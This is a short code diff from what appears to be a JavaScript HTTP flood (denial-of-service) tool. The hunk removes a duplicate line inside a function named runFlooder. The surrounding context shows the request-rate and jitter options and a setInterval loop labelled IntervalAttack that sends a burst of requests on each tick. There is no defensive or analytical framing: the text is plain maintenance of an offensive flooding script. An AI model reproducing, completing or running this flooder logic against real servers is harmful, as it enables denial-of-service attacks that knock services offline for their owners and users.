@@ -377,7 +377,6 @@ function runFlooder() {
 
         const requestRate = args.dual ? args.Rate * 2 : args.Rate;
         const requestInterval = args.icecool ? Math.floor(1000 / requestRate) + randomIntn(100, 200) : 1000 / requestRate;
-        const requestInterval = args.icecool ? Math.floor(1000 / requestRate) + randomIntn(100, 200) : 1000 / requestRate;
         const IntervalAttack = setInterval(() => {
             for (let i = 0; i < requestRate; i++) {
                 const bex = bexClient.request(headersbex)
